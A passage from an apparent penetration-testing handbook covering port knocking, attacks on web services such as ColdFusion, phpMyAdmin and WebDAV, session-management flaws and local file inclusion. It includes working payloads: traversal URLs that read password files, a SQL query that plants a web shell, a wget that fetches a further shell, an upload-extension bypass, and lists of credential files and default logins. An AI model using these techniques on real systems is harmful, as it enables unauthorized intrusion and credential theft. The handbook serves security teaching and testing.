certain ports in a specific order the ssh-port opens up, maybe for a few minutes, or maybe indefinitely
until you close it again.
When you "knock" on a port you are really just sending TCP-packets with SYN-flag to that port. The
closed port will then respond with a ACK/RST. Which basically means that the host has received the
TCP-packet, and it ACKnolwdge it, but responds with a Reset (RST) flag. RST just means that the
port is closed.
Software to implement port-knocking
I have seen the Knock software implemented.
Opening
So, how do we actually knock? As mentioned before a knock is essentially just sending a packet to a
specific port. I guess there are quite a few ways to do this. But here are three ways.
1. Knock
apt-get install knockd
Then you simply type: knock [ip] [port]. For example: knock
192.168.1.102 4000 5000 6000
After that you have to scan the network to see if any new port is open.
If you know what port is open you can connect to the port using netcat. The following
command would work nc 192.168.1.102 8888. This would then connect to the
port.
2. Nmap/bash
3. for x in 4000 5000 6000; do nmap -Pn --host_timeout 201 --max-
retries 0 -p $x server_ip_address; done
4. Netcat
nc 192.168.1.102 4000
nc 192.168.1.102 5000
nc 192.168.1.102 6000
nc 192.168.1.102 8888
106
Port Knocking
Break it
One way hack a server with port-knocking implemented would be to sniff for packets on the network.
So if you are on the same network and able to make MITM, you can just sniff that traffic and then
find the sequence.
Pitfalls
Using port-knocking as a way to secure your service might come with some risk. The biggest risk I
suppose is that if the knock-daemon fails, for whatever reason. You will be shut out of you machine.
There are of course ways to just restart the knock-daemon if it fails. But maybe that daemon fails as
well.
References
This wikipedia-article is really worth reading. https://en.wikipedia.org/wiki/Port_knocking
107
HTTP - Web Vulnerabilities
HTTP - Web Vulnerabilities
Web-services
Vulnerabilities on the web can cause many different times of hacks. You can use it to get access to
another users data. Or it can work as a step towards remote code execution.
A great way to see real examples of specific attack you can check hackerone.com like this through
google:
site:hackerone.com clickjacking
Visit OWASP top 10
This chapter is largely based on the OWASP top 10 vulnerabilities. So if you want a better
explanation just check out their website. https://www.owasp.org/index.php/Top_10_2013-Top_10
108
Common Web-services
Common Web-services
Common web-services
This is a list of some common web-services. The list is alphabetical.
Cold Fusion
If you have found a cold fusion you are almost certainly struck gold.
http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
Determine version
example.com/CFIDE/adminapi/base.cfc?wsdl It will say something like:
Version 8
FCKEDITOR
This works for version 8.0.1. So make sure to check the exact version.
use exploit/windows/http/coldfusion_fckeditor
LFI
This will output the hash of the password.
http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
You can pass the hash.
http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
neo-security.xml and password.properties
Drupal
Elastix
Full of vulnerabilities. The old versions at least.
http://example.com/vtigercrm/ default login is admin:admin
You might be able to upload shell in profile-photo.
109
Common Web-services
Joomla
Phpmyadmin
Default credentials
root 
pma 
If you find a phpMyAdmin part of a site that does not have any authentication, or you have managed
to bypass the authetication you can use it to upload a shell.
You go to:
http://192.168.1.101/phpmyadmin/
Then click on SQL.
Run SQL query/queries on server "localhost":
From here we can just run a sql-query that creates a php script that works as a shell
So we add the following query:
SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"
# For linux
SELECT "" into outfile "/var/www/html/shell.php"
The query is pretty self-explanatory. Now you just visit 192.168.1.101/shell.php?
cmd=ipconfig and you have a working web-shell. We can of course just write a superlong query
with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there
download a better shell.
Download a better shell
On linux-machines we can use wget to download a more powerful shell.
?cmd=wget%20192.168.1.102/shell.php
On windows-machines we can use tftp.
Webdav
Okay so webdav is old as hell, and not used very often. It is pretty much like ftp. But you go through
http to access it. So if you have webdav installed on a xamp-server you can access it like this:
cadaver 192.168.1.101/webdav
Then sign in with username and password. The default username and passwords on xamp are:
Username: wampp
Password: xampp
110
Common Web-services
Then use put and get to upload and download. With this you can of course upload a shell that gives
you better access.
If you are looking for live examples just google this:
inurl:webdav site:com
Test if it is possible to upload and execute files with webdav.
davtest -url http://192.168.1.101 -directory demo_dir -rand aaaa_upfileP0C
If you managed to gain access but is unable to execute code there is a workaround for that! So if
webdav has prohibited the user to upload .asp code, and pl and whatever, we can do this:
upload a file called shell443.txt, which of course is you .asp shell. And then you rename it to
shell443.asp;.jpg. Now you visit the page in the browser and the asp code will run and return your
shell.
References
http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf
Webmin
Webmin is a webgui to interact with the machine.
The password to enter is the same as the passsword for the root user, and other users if they have that
right. There are several vulnerabilites for it. It is run on port 10000.
Wordpress
sudo wpscan -u http://cybear32c.lab
If you hit a 403. That is, the request if forbidden for some reason. Read more here:
https://en.wikipedia.org/wiki/HTTP_403
It could mean that the server is suspicious because you don't have a proper user-agent in your request,
in wpscan you can solve this by inserting --random-agent. You can of course also define a specific
agent if you want that. But random-agent is pretty convenient.
sudo wpscan -u http://cybear32c.lab/ --random-agent
Scan for users
You can use wpscan to enumerat users:
111
Session Management
Session Management
112
Broken Authentication or Session Management
Broken Authentication or Session Management
Broken Authentication or Session Management
Authentication
Logout management
Log out in one tab but you stay logged in in another tab.
Click on log out and then go back in your browser, if you enter in the session again that is a
problem.
Session management
Session does not die after password reset
https://hackerone.com/reports/145430
Cookie is usable after session is killed
This might be an issue if you save the cookie, and then log out. And then inject the cookie into your
request again. If you can enter the session you have an issue. The issue here might be that the cookie
is cleared on the client-side but not on the server-side.
HttpOnly
HttpOnly is a optional flag in the Set-Cookie response header. If the flag is set javascript code is not
able to access the cookie. Which might prevent XSS. HttpOnly works if the browser honors that flag
of course. But most browsers today do. You can see this behaviour if you open up the devetools in
your browser and go to storage and look at the cookies. Then you can do
console.log(document.cookie) and it will only print out the cookie that has the HttpOnly
flag set to false.
SecureFlag
This is another optional flag for cookies. It is the application server that set it. By setting this flag the
browser will not send the cookie unencrypted.
Session-ID in URL
Session ID:s should never be showed in URLs. The risk is that if you pass the session-id in the URL
and then share the link with someone that person might inherit the session. But if you put the session-
id in the cookie that risk is avoided.
Password reset link does not expire
1. You create an account in example.com. You add email PI:EMAIL
2. Your email account gets hacked.
113
Broken Authentication or Session Management
3. The hacker figures out you have a user on example.com. The hacker clicks the reset-password-
link. But does not use it.
4. The hacked person figures out that he is hacked and thus goes to example.com to change his
password.
5. The hacker now clicks on the link and manage to reset the password.
The problem here is that the first reset-link should be blocked once the second is sent.
Relevant bug bounty reports
https://hackerone.com/reports/23579
https://hackerone.com/reports/39203
https://hackerone.com/reports/23921
Cookie does not expire
An easy way to test this is by using burp-suite.
1. Open burp-suite
2. Login to a website you want to test
3. Intercept the request, anyone will do.
4. Right click on the request in burp-suite and click on "Send to repeater". Now you have saved
that request for later. With the current cookie.
5. Log out from the website
6. Go to the Repeater-tab in burp and click on "Go".
7. Verify that you are redirected to the login.
Relevant reports on hackerone
https://hackerone.com/reports/18503
114
Session Fixation
Session Fixation
Session Fixation
Session fixation is a pretty small but common vulnerability.
A common way to handle the fact that HTTP is a stateless protocol is you store cookies in the users
browser, and then have that cookie send to the web server on each subsequent request. This way the
web server can know that the user has visited the website before. So when a user logs in to a web
application a cookie for that session is usually created, in order for the web-server to know that the
session is active.
Session fixation happens when the session-identifier (in this case the cookie) is setbefore the user has
authenticated itself (which is usually done with a simple username/password login), and then not
changed when the user authenticates itself.
For example, let's say you want to log in to a web application. When you first visit the site the
following cookie is set:
SessionID=123ad76dab97b23ba8d76a
You then authenticate with your username and password and make a successful login. But the
SessionID-cookie does not change. Then you have a session fixation vulnerability on your hands.
Because this means that if an attacker can set the SessionID-cookie to a value the attacker knows it
will then know the SessionID-cookie once the user actually authenticates.
How to set the cookie?
In GET request - if the session-token is sent in the URL of a GET-request the attacker can simply
send a link which contains the attacker-controlled session-token.
XSS - If the attacker has also found a XSS vulnerability she can use it to set the cookie. This can of
course be mitigated by setting the HttpOnly attribute to the cookie.
META-tag - If the attacker has the ability to inject html-code she can use the META-tag to set the
cookie.
http://website.kon/
MITM - By being MITM the attacker can set the cookie.
115
WAF - Web Application Firewall
WAF - Web Application Firewall
WAF - Web application firewall
One of the first things we should do when starting to poke on a website is see what WAF it has.
Identify the WAF
wafw00f http://example.com
http://securityidiots.com/Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html
116
Attacking the System
Attacking the System
Attacking the System
I have divided the web-vulnerabilites into two categories: Attacking the System and Attacking the
User. I know this might seem like a pretty weird categorization, but I think it make sense. So in this
chapter we will look at vulnerabilities that primarily focus on the webserver, and not the visiting
users.
117
Attacking the System
Local File Inclusion
Local File Inclusion (LFI)
Local file inclusion means unauthorized access to files on the system. This vulnerability lets the
attacker gain access to sensitive files on the server, and it might also lead to gaining a shell.
How does it work?
The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites.
Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter
into the require-function without any sanitization. So the user can just add the path to any file.
$file = $_GET['page'];
require($file);
In this example the user could just enter this string and retrieve the /etc/passwd file.
http://example.com/page=../../../../../../etc/passwd
Bypassing the added .php and other extra file-endings
It is common to add the file-extension through the php-code. Here is how this would look like:
$file = $_GET['page'];
require($file . ".php");
The php is added to the filename, this will mean that we will not be able to find the files we are
looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to
the end of our attack-string the .php will not be taken into account. So we add %00 to the end of our
attack-string.
http://example.com/page=../../../../../../etc/passwd%00
This technique is usually called the nullbyte technique since %00 is the nullbyte. The technique only
works in versions below php 5.3. So look out for that.
Another way to deal with this problem is just to add a question mark to your attack-string. This way
the stuff after gets interpreted as a parameter and therefore excluded. Here is an example:
http://example.com/page=../../../../../../etc/passwd?
Bypassing php-execution
So if you have an LFI you can easily read .txt-files but not .php files. That is because they get
executed by the webserver, since their file-ending says that it contains code. This can be bypassed by
using a build-in php-filter.
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
118
Attacking the System
Here you use a php-filter to convert it all into base64. So in return you get the whole page base64
encoded. Now you only need to decode it. Save the base64-text into a file and then run:
base64 -d savefile.php
Linux
Tricks
Download config-files in a nice style-format
If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A
way around it is to download the files from the terminal. But that won't work if there is a login that is
blocking it. So this is a great workaround:
# First we save the cookie
curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
Sensitive file
This is the default layout of important apache files.
https://wiki.apache.org/httpd/DistrosDefaultLayout
/etc/issue (A message or system identification to be printed before the login prompt.)
/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
/etc/passwd
/etc/group
/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
/etc/shadow
/home/[USERNAME]/.bash_history or .profile
~/.bash_history or .profile
$USER/.bash_history or .profile
/root/.bash_history or .profile
Comes from here: https://gist.github.com/sckalath/a8fd4e754a72015aa0b8
/etc/mtab
/etc/inetd.conf
/var/log/dmessage
Web server files
# Usually found in the root of the website
.htaccess
config.php
SSH
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
119
Attacking the System
Logs
/etc/httpd/logs/acces_log
/etc/httpd/logs/error_log
/var/www/logs/access_log
/var/www/logs/access.log
/usr/local/apache/logs/access_ log
/usr/local/apache/logs/access. log
/var/log/apache/access_log
/var/log/apache2/access_log
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/access_log
User specific files
Found in the home-directory
.bash_history
.mysql_history
.my.cnf